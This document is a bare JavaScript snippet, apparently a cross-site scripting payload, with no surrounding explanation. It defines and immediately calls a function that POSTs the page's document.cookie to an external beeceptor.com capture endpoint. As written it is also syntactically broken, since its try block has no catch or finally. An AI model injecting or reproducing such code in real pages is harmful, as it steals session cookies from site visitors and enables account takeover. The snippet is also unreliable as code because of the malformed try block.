async function envoyerDonnees() {
  try {
    const response = await fetch("https://recept.free.beeceptor.com/g", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        cookie: document.cookie,
        age: 25
      })
    });
  }
}
envoyerDonnees();
  
